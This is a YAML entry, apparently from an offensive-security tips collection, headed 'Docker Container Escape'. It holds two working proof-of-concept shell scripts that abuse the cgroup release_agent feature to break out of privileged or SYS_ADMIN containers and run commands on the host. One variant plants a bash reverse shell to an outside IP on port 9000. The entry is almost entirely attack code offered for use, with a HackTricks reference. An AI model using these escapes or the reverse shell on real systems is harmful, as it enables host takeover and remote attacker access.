---
functions:
  ttp-tip:
    - description: Docker Container Escape
      code: |
        Initial PoC
		# spawn a new container to exploit via:
		# docker run --rm -it --privileged ubuntu bash
		 
		d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
		mkdir -p $d/w;echo 1 >$d/w/notify_on_release
		t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
		touch /o;
		echo $t/c >$d/release_agent;
		echo "#!/bin/sh $1 >$t/o" >/c;
		chmod +x /c;
		sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o


		Second PoC
		# On the host
		docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
		 
		# In the container
		mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
		 
		echo 1 > /tmp/cgrp/x/notify_on_release
		host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
		echo "$host_path/cmd" > /tmp/cgrp/release_agent

		#For a normal PoC =================
		echo '#!/bin/sh' > /cmd
		echo "ps aux > $host_path/output" >> /cmd
		chmod a+x /cmd
		#===================================
		#Reverse shell
		echo '#!/bin/bash' > /cmd
		echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
		chmod a+x /cmd
		#===================================
		 
		sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
		head /output

resources: |
  https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-a-docker-container
---